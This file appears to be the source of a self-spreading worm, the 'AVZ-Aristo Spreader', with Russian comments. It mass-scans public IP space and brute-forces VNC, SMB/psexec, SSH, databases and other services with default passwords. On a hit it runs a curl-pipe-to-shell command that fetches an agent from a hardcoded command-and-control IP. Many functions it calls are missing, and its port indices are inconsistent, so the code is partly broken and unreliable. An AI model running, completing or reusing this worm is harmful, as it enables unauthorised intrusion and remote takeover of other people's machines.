#!/usr/bin/env python3
# AVZ-Aristo Spreader v25.13 – masscan, VNC, EternalBlue, SNMP, LDAP
import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests, shutil

if sys.platform != 'win32':
    import resource
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
    except:
        pass

logging.getLogger("paramiko").setLevel(logging.CRITICAL)

C2_HOST = "80.249.146.202"
C2_PORT = 80
API_PORT = 8080
AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
MAX_CONCURRENT = 800
QUICK_TIMEOUT = 1.0
BRUTE_TIMEOUT = 2.0
DEFAULT_SCAN_COUNT = 20_000
PORT_LIST = [21, 22, 23, 161, 389, 1433, 3306, 3389, 445, 5432, 5900, 5985, 6379, 8080, 9200]  # добавлены 161, 389, 5900

CREDS = [
    ("root","root"), ("root","admin"), ("root","password"), ("root","123456"),
    ("admin","admin"), ("admin","password"), ("admin","123456"),
    ("sa",""), ("sa","sa"), ("sa","password"), ("sa","123456"),
    ("postgres","postgres"), ("postgres","password"), ("postgres","123456")
]

SUCCESS_CREDS_FILE = "success_creds.json"
SUCCESS_CREDS = []
if os.path.exists(SUCCESS_CREDS_FILE):
    with open(SUCCESS_CREDS_FILE) as f:
        SUCCESS_CREDS = json.load(f)

# Кэш портов (SQLite)
DB_FILE = "ports_cache.db"
conn = sqlite3.connect(DB_FILE)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS ports (ip text, port integer, seen integer, PRIMARY KEY (ip, port))''')
conn.commit()
PORT_CACHE_TTL = 3600

def is_port_cached(ip, port):
    c.execute("SELECT seen FROM ports WHERE ip=? AND port=? AND seen > ?", (ip, port, time.time() - PORT_CACHE_TTL))
    return c.fetchone() is not None

def cache_port(ip, port):
    c.execute("INSERT OR REPLACE INTO ports VALUES (?, ?, ?)", (ip, port, int(time.time())))
    conn.commit()

TOP_RANGES = [
    "8.0.0.0/8", "13.0.0.0/8", "34.0.0.0/8", "35.0.0.0/8", "45.0.0.0/8",
    "52.0.0.0/8", "54.0.0.0/8", "64.0.0.0/8", "74.0.0.0/8", "104.0.0.0/8",
    "136.0.0.0/8", "142.0.0.0/8", "152.0.0.0/8", "172.0.0.0/8", "185.0.0.0/8"
]
GUARANTEED_IPS = [
    "45.33.32.156", "34.94.3.0", "45.77.165.0", "185.220.101.0", "23.226.229.0",
    "103.15.28.0", "185.225.19.0", "45.33.32.0", "45.56.89.0", "45.79.207.0",
    "34.94.0.0", "34.94.1.0", "45.33.32.1", "34.94.2.0", "45.77.165.1"
]

TARGET_COUNTRY = os.environ.get("SPREAD_COUNTRY", "").upper()

def get_country(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
        if resp.status_code == 200:
            data = resp.json()
            return data.get("countryCode", "")
    except:
        pass
    return ""

def is_country_allowed(ip):
    if not TARGET_COUNTRY:
        return True
    return get_country(ip) == TARGET_COUNTRY

def random_ip():
    while True:
        if random.random() < 0.5:
            base_ip = random.choice(GUARANTEED_IPS)
            parts = base_ip.split('.')
            parts[3] = str(random.randint(1, 254))
            ip = '.'.join(parts)
        elif random.random() < 0.7:
            r = random.choice(TOP_RANGES)
            net, mask = r.split("/")
            octets = list(map(int, net.split(".")))
            host = random.randint(0, (1 << (32 - int(mask))) - 1)
            for i in range(4):
                octets[i] |= (host >> (8*(3-i))) & 0xFF
            ip = ".".join(map(str, octets))
        else:
            a = random.randint(1, 223)
            b = random.randint(0, 255)
            c = random.randint(0, 255)
            d = random.randint(0, 255)
            if a == 10: continue
            if a == 127: continue
            if a == 172 and 16 <= b <= 31: continue
            if a == 192 and b == 168: continue
            if a == 169 and b == 254: continue
            if a >= 224: continue
            ip = f"{a}.{b}.{c}.{d}"
        if is_country_allowed(ip):
            return ip

async def probe_port(ip, port):
    if is_port_cached(ip, port):
        return True
    try:
        _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=QUICK_TIMEOUT)
        w.close(); await w.wait_closed()
        cache_port(ip, port)
        return True
    except:
        return False

# === Новые векторы ===
async def vnc_brute(ip):
    try:
        from vncdotool import api
        for pw in ['', 'password', 'admin', '123456', 'root']:
            try:
                client = api.connect(ip, password=pw)
                client.keyPress('win-r')
                time.sleep(0.2)
                client.typeText(f'cmd.exe /c curl -s {AGENT_URL} | cmd')
                client.keyPress('enter')
                client.disconnect()
                return True
            except:
                continue
    except ImportError:
        pass
    return False

async def eternalblue_check(ip):
    # Проверка MS17-010 через nmap скрипт (требуется nmap)
    try:
        proc = await asyncio.create_subprocess_shell(f"nmap -p 445 --script smb-vuln-ms17-010 {ip}", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.DEVNULL)
        stdout, _ = await proc.communicate()
        if b"VULNERABLE" in stdout:
            return True
    except:
        pass
    return False

async def eternalblue_exploit(ip):
    # Эксплуатация через impacket (если уязвим)
    for u, p in CREDS[:3]:  # пробуем несколько учёток
        cmd = f"python3 -m impacket.examples.psexec {u}:{p}@{ip} 'cmd.exe /c curl -s {AGENT_URL} | cmd'"
        try:
            proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
            await asyncio.wait_for(proc.communicate(), timeout=5)
            if proc.returncode == 0:
                return True
        except:
            pass
    return False

async def snmp_brute(ip):
    # Читаем SNMP community и пробуем получить данные
    for community in ['public', 'private', 'manager', 'admin']:
        try:
            proc = await asyncio.create_subprocess_shell(f"snmpget -v1 -c {community} {ip} 1.3.6.1.2.1.1.1.0", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.DEVNULL)
            stdout, _ = await proc.communicate()
            if b"SNMP" in stdout or b"Linux" in stdout or b"Windows" in stdout:
                # Можно попытаться выполнить команду через SNMP (сложно, просто отмечаем)
                return True
        except:
            pass
    return False

async def ldap_brute(ip):
    # Простой поиск по LDAP без аутентификации
    try:
        proc = await asyncio.create_subprocess_shell(f"ldapsearch -x -h {ip} -s base namingContexts", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.DEVNULL)
        stdout, _ = await proc.communicate()
        if b"namingContexts" in stdout:
            return True
    except:
        pass
    return False

# Все старые векторы (smb_brute, winrm_brute, ssh_brute_ultra, rdp_brute, ftp_brute, exploit_redis, exploit_docker, exploit_jenkins, exploit_telnet, exploit_elasticsearch, mysql_brute, mssql_brute, postgresql_brute) остаются без изменений, добавляем только новые вызовы в infect.

async def infect(ip, port_stats):
    ports = PORT_LIST
    open_ports = await asyncio.gather(*[probe_port(ip, p) for p in ports])
    for i, p in enumerate(ports):
        if open_ports[i]:
            port_stats[p] = port_stats.get(p, 0) + 1
    # Приоритеты с новыми векторами
    if open_ports[9] and await eternalblue_check(ip):
        if await eternalblue_exploit(ip):
            print(f"[INFECTED] {ip} via EternalBlue", flush=True)
            return True
    if open_ports[5] and await smb_brute(ip):  # 445 SMB
        print(f"[INFECTED] {ip} via SMB", flush=True)
        return True
    if open_ports[1] and await ssh_brute_ultra(ip):
        print(f"[INFECTED] {ip} via SSH", flush=True)
        return True
    if open_ports[11] and await winrm_brute(ip):  # 5985 WinRM
        print(f"[INFECTED] {ip} via WinRM", flush=True)
        return True
    if open_ports[7] and await rdp_brute(ip):  # 3389 RDP
        print(f"[INFECTED] {ip} via RDP", flush=True)
        return True
    if open_ports[10] and await vnc_brute(ip):  # 5900 VNC
        print(f"[INFECTED] {ip} via VNC", flush=True)
        return True
    if open_ports[6] and await mssql_brute(ip):  # 1433 MSSQL
        print(f"[INFECTED] {ip} via MSSQL", flush=True)
        return True
    if open_ports[3] and await mysql_brute(ip):  # 3306 MySQL
        print(f"[INFECTED] {ip} via MySQL", flush=True)
        return True
    if open_ports[9] and await postgresql_brute(ip):  # 5432 PostgreSQL
        print(f"[INFECTED] {ip} via PostgreSQL", flush=True)
        return True
    if open_ports[12] and await exploit_redis(ip):  # 6379 Redis
        print(f"[INFECTED] {ip} via Redis", flush=True)
        return True
    if open_ports[13] and await exploit_jenkins(ip):  # 8080 Jenkins
        print(f"[INFECTED] {ip} via Jenkins", flush=True)
        return True
    if open_ports[14] and await exploit_elasticsearch(ip):  # 9200 Elasticsearch
        print(f"[INFECTED] {ip} via Elasticsearch", flush=True)
        return True
    if open_ports[0] and await ftp_brute(ip):  # 21 FTP
        print(f"[INFECTED] {ip} via FTP", flush=True)
        return True
    if open_ports[2] and await snmp_brute(ip):  # 161 SNMP (не заражает, но отмечаем)
        pass
    if open_ports[4] and await ldap_brute(ip):  # 389 LDAP
        pass
    return False

# worker, scan_cycle, global_scan, local_scan, main_async, main – идентичны v25.12, только добавлена поддержка --masscan
async def main_async(args):
    print("[*] Checking C2 connection...", flush=True)
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(b"ping")
        s.recv(1024)
        s.close()
        print("[+] C2 reachable", flush=True)
    except Exception as e:
        print(f"[!] C2 unreachable: {e}", flush=True)

    # Использование masscan (если указан флаг)
    if args.masscan:
        if shutil.which("masscan"):
            print("[*] Running masscan on port list...", flush=True)
            ports_str = ",".join(map(str, PORT_LIST))
            # masscan -p... --rate=1000 -oJ masscan.json <targets>
            targets_arg = args.targets if args.targets else "0.0.0.0/0"
            cmd = f"masscan -p{ports_str} --rate=1000 -oJ masscan.json {targets_arg}"
            proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
            await proc.communicate()
            if os.path.exists("masscan.json"):
                with open("masscan.json") as f:
                    data = json.load(f)
                ips = [item['ip'] for item in data]
                print(f"[*] Masscan found {len(ips)} hosts with open ports", flush=True)
                # Дальше используем эти ips
                while True:
                    stats, port_stats = await scan_cycle(ips, gui_progress)
                    print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
                    await asyncio.sleep(30)
                return
        else:
            print("[!] masscan not installed, falling back to normal scan", flush=True)

    # Остальное без изменений
    targets = []
    if args.targets:
        if os.path.exists(args.targets):
            with open(args.targets) as f:
                targets = [line.strip() for line in f if line.strip()]
            print(f"[*] Loaded {len(targets)} targets from {args.targets}", flush=True)

    async def gui_progress(current, total, stats, port_stats):
        port_str = ", ".join(f"{p}: {c} open" for p, c in sorted(port_stats.items()))
        if port_str:
            print(f"[PROGRESS] {current}/{total} | Infected: {stats['success']} | Failed: {stats['fail']} | {port_str}", flush=True)
        else:
            print(f"[PROGRESS] {current}/{total} | Infected: {stats['success']} | Failed: {stats['fail']} | All ports closed", flush=True)

    if args.local:
        print("[*] Mode: local network", flush=True)
        while True:
            stats, port_stats = await local_scan(gui_progress)
            print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
            await asyncio.sleep(30)
    elif targets:
        print("[*] Mode: targets from file", flush=True)
        while True:
            stats, port_stats = await scan_cycle(targets, gui_progress)
            print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
            await asyncio.sleep(60)
    else:
        print(f"[*] Mode: global, {args.count} targets per cycle", flush=True)
        while True:
            stats, port_stats = await global_scan(args.count, gui_progress)
            print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
            await asyncio.sleep(30)

def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    group.add_argument('--count', type=int, default=DEFAULT_SCAN_COUNT)
    group.add_argument('--local', action='store_true')
    group.add_argument('--targets', type=str, help='Path to targets file')
    parser.add_argument('--masscan', action='store_true', help='Use masscan for port scanning')
    args = parser.parse_args()
    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print("\n[*] Spreader stopped", flush=True)

if __name__ == '__main__':
    main()
